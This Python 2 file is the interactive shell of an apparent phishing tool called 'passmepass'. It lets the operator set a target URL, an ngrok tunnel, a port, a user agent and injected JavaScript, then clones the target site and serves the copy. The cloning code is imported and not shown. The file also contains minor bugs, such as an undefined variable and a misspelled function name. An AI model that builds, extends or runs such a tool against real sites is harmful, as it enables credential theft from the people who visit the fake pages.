import sys
import os
import time
from core.complete import complete
from core.array import array
from core.printf import printf
from core.help import helpp
from core.keys import url
from core.keys import ngrok
from core.keys import port
from core.keys import userAgent
from core.keys import html
from core.keys import files
from core.keys import exjs
from core.keys import quiet_mode
from core.author import fish
from core.help import helpp
from core.httpd import passmepass
from core.logo import logoo

def bunner():
    logoo()

def profile_getkey(profile_file, key):
    try:
        profile = open(profile_file, "r").readlines()
    except Exception as e:
        return 0
    if profile == None:
        return 0
    for line in profile:
        if line.startswith("\n") or line.startswith("#"):
            pass

        else:
            (skey,value) = line.split(" = ")
            if skey == key:
                return str(value[:-1])

    return 0

def shell_noint(profile_file):
    global url
    global port
    global ngrok
    global userAgent
    global html
    global exjs
    global files

    try:
        url = profile_getkey(profile_file,"url")
        ngrok = profile_getkey(profile_file, "ngrok")
        port = int(profile_getkey(profile_file, "port"))
        userAgent = profile_getkey(profile_file, "userAgent")
        html = profile_getkey(profile_file, "html")
        exjs = profile_getkey(profile_file, "exjs")

        print_startup()
        s = passmepass(url,port)
        s.clone()
        s.serve()

    except ValueError:
        printf(1, "Error: your profile file looks bad.")
    except KeyboardInterrupt:
        s = passmepass(url,port)
        s.cleanup()
        print("\nInterrupt ...")
    except IndexError:
        if prompt[0] == "help" or prompt[0] == "?":
            helpp()
        else:
            printtf(1, "Error: please provide option for \'%s\'." %prompt[0])
    except Exception as e:
        printf(1,"3rror:(%s)" %(str(e)))

def shell():

    global url
    global ngrok
    global port
    global files
    global userAgent
    global html
    global exjs

    logoo()
    if os.path.exists("memory.log"):
        if os.stat("memory.log").st_size == 0:
            memory = open("memory.log","w")
        else:
            memory = open("memory.log","a")
    else:
        memory = open("memory.log","w")

    while True:
        try:
            complete(array)
            sw = raw_input("passmepass >>>") or "help"
            prompt = sw.split()
            if not prompt:
                continue
            elif prompt[0] == "clear":
                logoo()
            elif prompt[0] == "quit" or prompt[0] == "q":
                printf(1,".........")
                time.sleep(0.5)
                printf(1,"passmepass.....sleep")
                break
            elif prompt[0] == "help" or prompt[0] == "?":
                helpp()
            elif prompt[0] == "show":
                sys.stdout.write("\033[37m\t")
                print("-" * 18)
                print("\turl          : %s " %url)
                print("\tport         : %d " %(port))
                print("\tngrok url    : %s " %(ngrok))
                print("\tuser_agent   : %s " %(userAgent))
                print("\thtml_file    : %s " %(html))
                print("\texternal_js  : %s " %(exjs))
                sys.stdout.write("\t")
                print("-" * 18)
                sys.stdout.write("\033[00m")
            elif prompt[0] == "url":
                url = str(prompt[1])
                memory.write("url = %s\n" %url)
            elif prompt[0] == "ngrok":
                ngrok = str(prompt[1])
                memory.write("ngrok = %s\n"%ngrok)
            elif prompt[0] == "port":
                port = int(prompt[1])
                if port == 80 and os.getuid() !=0:
                    printf(1,"if you want use port 80. please run root");
                memory.write("port = %s\n" %port)


            elif prompt[0] == "run":
                if not url and not html:
                    printf(1,"3rror:please set \"url\".")
                elif not ngrok:
                    printf(1,"3rror:please set \"ngrok\".")
                else:
                    s = passmepass(url,port)
                    s.clone()
                    s.serve()
            elif prompt[0] == "logo" or prompt[0] == "banner":
                logoo()
            else:
                printf(1,"3rror: not found command\'%s\'."%prompt[0])

        except KeyboardInterrupt:
            s = passmepass(url,port)
            s.cleanup()
            print("\n%s" %fish)
        except IndexError:
            if prompt[0] == "help" or prompt[0] == "?":
                helpp()
            else:
                printf(1, "Error: please provide option for \'%s\'." %prompt[0])
        except Exception as e:
            printf(1, "Error: (%s)" %(str(e)))

